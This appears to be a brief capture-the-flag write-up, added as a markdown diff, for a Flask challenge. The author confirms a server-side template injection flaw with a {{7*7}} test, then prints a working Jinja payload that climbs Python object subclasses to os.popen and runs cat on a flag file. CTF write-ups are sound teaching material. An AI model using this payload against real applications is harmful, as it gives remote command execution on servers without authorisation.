@@ -1,0 +1,17 @@
+the description says its a flask app
+and there is an input field and no source code this must be an SSTI stands for (server side template injection) vulnerability
+
+we can verify by sending {{7*7}} in the input field and it will say
+
+```
+Woooow, is it really 49
+```
+
+aww how is that possible so we look for some ssti payloads and after some testing this worked for me
+```
+{{().__class__.__bases__[0].__subclasses__()[226]()._module.__builtins__["__import__"]("os").popen('cat+.Flag.txt').read()}}
+```
+
+
+NOTE:
+im sure that there is a lot of payloads that will work for you 
